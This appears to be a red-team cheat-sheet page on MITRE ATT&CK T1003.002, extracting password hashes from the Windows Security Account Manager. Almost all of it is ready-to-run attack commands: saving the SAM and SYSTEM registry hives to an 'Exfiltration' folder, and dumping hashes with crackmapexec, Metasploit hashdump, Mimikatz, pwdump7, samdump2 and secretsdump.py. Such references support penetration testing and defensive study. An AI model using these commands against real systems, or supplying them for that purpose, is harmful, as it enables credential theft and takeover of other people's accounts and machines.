---
description: https://attack.mitre.org/techniques/T1003/002/
---

# Security Account Manager (SAM)

## T1003.002 Security Account Manager

**Permissions Required:** <mark style="color:red;">SYSTEM</mark>

**Description**

Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command. Enumerating the SAM database requires SYSTEM level access.

## Techniques

### Save the SAM and SYSTEM databases.

```batch
reg save HKLM\SAM c:\Exfiltration\SAM
reg save HKLM\SYSTEM c:\Exfiltration\SYSTEM
```

### Crackmapexec

```bash
crackmapexec smb <IP> -u <User> -p <Password> --sam

# Use the local-auth parameter when authenticating as a local account
crackmapexec smb <IP> -u <User> -p <Password> --sam --local-auth
```

![](<../../../../../../.gitbook/assets/image (2045) (1).png>)

### Metasploit

```bash
# Modules
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector

# Meterpreter Shell
hashdump

# Extension:Kiwi
lsa_dump_sam
```

![](<../../../../../../.gitbook/assets/image (2074) (1).png>)

### Mimikatz

```powershell
# Dump from SAM and SYSTEM. Enusre files are in current working directory
Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"
```

![](<../../../../../../.gitbook/assets/Mimikatz-SAM-SYSTEM (1).png>)

### pwdump

**URL:** [https://www.tarasco.org/security/pwdump\_7](https://www.tarasco.org/security/pwdump\_7/)/

```
# Dump system passwords
./pwdump7.exe

#  Dump passwords from SAM and System files
pwdump7.exe -s <samfile> <systemfile>
```

### SamDump2

```bash
# Dump from SAM and SYSTEM. Enusre files are in current working directory
samdump2 SYSTEM SAM
```

![](<../../../../../../.gitbook/assets/image (2071) (1).png>)

### Secretsdump.py

```bash
# Dump from SAM and SYSTEM. Enusre files are in current working directory
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

![](<../../../../../../.gitbook/assets/image (2047) (1).png>)
